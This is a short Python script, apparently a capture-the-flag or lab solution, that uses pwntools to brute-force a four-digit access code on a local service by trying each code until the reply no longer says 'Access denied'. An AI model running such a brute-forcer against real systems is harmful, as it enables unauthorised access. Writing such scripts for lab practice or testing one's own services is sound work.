from pwn import *
target_host = "localhost"
target_port = 910

for i in range (0, 9999):
    code=('{:d}'.format(i).zfill(4))
    conn = remote(target_host,target_port, level='error')
    conn.recvuntil("[$]")
    conn.sendline(code)
    result = conn.recvline()
    conn.close()
    result2 = str(result)
    if "Access denied" not in result2:
        print("Valid code found: ",code)
        break
